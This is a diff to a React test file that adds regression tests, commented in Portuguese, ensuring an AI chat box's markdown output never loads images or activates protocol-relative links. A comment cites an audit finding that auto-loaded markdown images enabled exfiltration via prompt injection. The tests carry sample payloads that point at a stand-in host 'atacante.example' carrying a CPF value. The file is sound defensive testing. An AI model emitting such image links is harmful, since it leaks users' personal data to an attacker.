@@ -4,6 +4,7 @@ import { render, cleanup } from "@testing-library/react";
 import { createElement } from "react";
 import Markdown from "react-markdown";
 import { safeAiUrl } from "@/lib/aiSafeUrl";
+import { AI_MARKDOWN_COMPONENTS } from "@/lib/aiSafeMarkdown";
 
 // O AIChatBox renderiza a saída da IA com <Streamdown rehypePlugins={[]}
 // urlTransform={safeAiUrl}> — o Streamdown apenas repassa essas props ao
@@ -18,6 +19,7 @@ function renderAi(content: string) {
     createElement(Markdown, {
       rehypePlugins: [],
       urlTransform: safeAiUrl,
+      components: AI_MARKDOWN_COMPONENTS,
       children: content,
     })
   );
@@ -36,6 +38,30 @@ function semHtmlAtivo(container: HTMLElement) {
 }
 
 afterEach(() => cleanup());
+
+// Trava da auditoria 23/11/2026: imagem markdown era buscada pelo navegador sem
+// clique → exfiltração por prompt injection.
+describe("saída da IA — imagem nunca é carregada", () => {
+  it("![](https://atacante/?d=...) vira texto, sem <img>", () => {
+    const { container } = renderAi(
+      "Resumo ![x](https://atacante.example/?d=CPF123) fim"
+    );
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.textContent).toContain("[imagem: x]");
+    expect(container.innerHTML).not.toContain("atacante.example");
+  });
+  it("link protocol-relative //host não vira link ativo", () => {
+    const { container } = renderAi("[clique](//atacante.example/x)");
+    const a = container.querySelector("a");
+    expect(a?.getAttribute("href") ?? "").not.toContain("atacante");
+  });
+  it("link https comum continua (exige clique)", () => {
+    const { container } = renderAi("[site](https://exemplo.com)");
+    expect(container.querySelector("a")?.getAttribute("href")).toBe(
+      "https://exemplo.com"
+    );
+  });
+});
 
 describe("saída da IA — sem HTML ativo no DOM (Lote A)", () => {
   it("iframe+srcdoc+script NÃO viram elementos ativos", () => {
